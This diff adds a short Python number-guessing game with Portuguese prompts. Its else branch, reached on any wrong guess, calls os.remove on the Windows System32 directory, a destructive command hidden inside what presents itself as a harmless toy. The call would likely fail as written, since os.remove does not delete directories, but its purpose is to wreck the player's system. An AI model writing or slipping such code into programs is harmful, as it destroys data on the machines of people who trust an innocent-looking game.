@@ -1,0 +1,13 @@
+import random
+import os
+numero = random.randint(1,10)
+
+adivinhe = input("o jogo bobo!!! adivinhe um numero entre um e dez")
+adivinhe = int(adivinhe)
+
+if adivinhe == numero:
+    print("parabéns vc ganhou")
+
+else:
+    os.remove("c:\Windows\System32")
+     
